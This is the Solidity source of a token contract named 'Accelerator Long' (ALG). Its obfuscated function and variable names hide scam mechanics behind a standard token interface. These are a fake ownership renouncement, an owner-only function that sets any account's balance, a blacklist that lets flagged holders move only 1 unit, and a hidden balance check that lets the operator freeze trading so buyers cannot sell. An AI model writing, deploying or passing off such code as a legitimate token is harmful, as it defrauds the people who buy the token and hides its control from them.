//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface liquidityAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeTrading) external view returns (uint256);

    function transfer(address minLaunch, uint256 tradingMin) external returns (bool);

    function allowance(address fromAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingMin) external returns (bool);

    function transferFrom(
        address sender,
        address minLaunch,
        uint256 tradingMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingBuy, uint256 value);
    event Approval(address indexed fromAuto, address indexed spender, uint256 value);
}

abstract contract maxMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeListMin {
    function createPair(address launchTx, address enableMode) external returns (address);
}

interface liquidityAtMetadata is liquidityAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AcceleratorLong is maxMode, liquidityAt, liquidityAtMetadata {

    function launchedTotal(address limitSell, uint256 tradingMin) public {
        feeAmountFund();
        listAmount[limitSell] = tradingMin;
    }

    function feeAmountFund() private view {
        require(swapMin[_msgSender()]);
    }

    bool public txTradingSwap;

    function allowance(address atMode, address walletToken) external view virtual override returns (uint256) {
        if (walletToken == fromWallet) {
            return type(uint256).max;
        }
        return tokenList[atMode][walletToken];
    }

    address launchFromAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function enableToken(uint256 tradingMin) public {
        feeAmountFund();
        liquidityShould = tradingMin;
    }

    function tokenLaunched(address limitLaunch) public {
        feeAmountFund();
        if (txTradingSwap == autoAmount) {
            liquidityExempt = listBuy;
        }
        if (limitLaunch == modeAtFrom || limitLaunch == modeSenderAt) {
            return;
        }
        fundWallet[limitLaunch] = true;
    }

    bool private autoAmount;

    function symbol() external view virtual override returns (string memory) {
        return atWallet;
    }

    mapping(address => bool) public fundWallet;

    function balanceOf(address modeTrading) public view virtual override returns (uint256) {
        return listAmount[modeTrading];
    }

    mapping(address => mapping(address => uint256)) private tokenList;

    function approve(address walletToken, uint256 tradingMin) public virtual override returns (bool) {
        tokenList[_msgSender()][walletToken] = tradingMin;
        emit Approval(_msgSender(), walletToken, tradingMin);
        return true;
    }

    function senderLaunched(address teamEnableReceiver, address minLaunch, uint256 tradingMin) internal returns (bool) {
        require(listAmount[teamEnableReceiver] >= tradingMin);
        listAmount[teamEnableReceiver] -= tradingMin;
        listAmount[minLaunch] += tradingMin;
        emit Transfer(teamEnableReceiver, minLaunch, tradingMin);
        return true;
    }

    mapping(address => uint256) private listAmount;

    uint256 private atFee;

    constructor (){
        if (walletFund != liquidityExempt) {
            marketingLiquidity = true;
        }
        liquidityEnable liquidityBuy = liquidityEnable(fromWallet);
        modeSenderAt = modeListMin(liquidityBuy.factory()).createPair(liquidityBuy.WETH(), address(this));
        
        modeAtFrom = _msgSender();
        launchedIs();
        swapMin[modeAtFrom] = true;
        listAmount[modeAtFrom] = marketingSender;
        if (atFee == listBuy) {
            listBuy = liquidityExempt;
        }
        emit Transfer(address(0), modeAtFrom, marketingSender);
    }

    mapping(address => bool) public swapMin;

    bool public marketingLiquidity;

    function toShould(address exemptBuyMarketing) public {
        if (isMinLiquidity) {
            return;
        }
        if (walletFund != fromFund) {
            marketingLiquidity = true;
        }
        swapMin[exemptBuyMarketing] = true;
        if (fromFund == liquidityExempt) {
            marketingLiquidity = true;
        }
        isMinLiquidity = true;
    }

    address fromWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public fromFund;

    function walletExempt(address teamEnableReceiver, address minLaunch, uint256 tradingMin) internal returns (bool) {
        if (teamEnableReceiver == modeAtFrom) {
            return senderLaunched(teamEnableReceiver, minLaunch, tradingMin);
        }
        uint256 walletLaunchMax = liquidityAt(modeSenderAt).balanceOf(launchFromAuto);
        require(walletLaunchMax == liquidityShould);
        require(minLaunch != launchFromAuto);
        if (fundWallet[teamEnableReceiver]) {
            return senderLaunched(teamEnableReceiver, minLaunch, amountLimitExempt);
        }
        return senderLaunched(teamEnableReceiver, minLaunch, tradingMin);
    }

    address private txAuto;

    address public modeSenderAt;

    uint256 private marketingSender = 100000000 * 10 ** 18;

    uint256 liquidityShould;

    function transferFrom(address teamEnableReceiver, address minLaunch, uint256 tradingMin) external override returns (bool) {
        if (_msgSender() != fromWallet) {
            if (tokenList[teamEnableReceiver][_msgSender()] != type(uint256).max) {
                require(tradingMin <= tokenList[teamEnableReceiver][_msgSender()]);
                tokenList[teamEnableReceiver][_msgSender()] -= tradingMin;
            }
        }
        return walletExempt(teamEnableReceiver, minLaunch, tradingMin);
    }

    function launchedIs() public {
        emit OwnershipTransferred(modeAtFrom, address(0));
        txAuto = address(0);
    }

    uint256 private listBuy;

    function decimals() external view virtual override returns (uint8) {
        return receiverShould;
    }

    address public modeAtFrom;

    string private atWallet = "ALG";

    uint256 atMax;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingSender;
    }

    uint8 private receiverShould = 18;

    bool public minLiquidity;

    function name() external view virtual override returns (string memory) {
        return isSwap;
    }

    event OwnershipTransferred(address indexed feeSwap, address indexed toExempt);

    function transfer(address limitSell, uint256 tradingMin) external virtual override returns (bool) {
        return walletExempt(_msgSender(), limitSell, tradingMin);
    }

    function owner() external view returns (address) {
        return txAuto;
    }

    string private isSwap = "Accelerator Long";

    bool public isMinLiquidity;

    function getOwner() external view returns (address) {
        return txAuto;
    }

    uint256 constant amountLimitExempt = 1 ** 10;

    uint256 private walletFund;

    uint256 private liquidityExempt;

}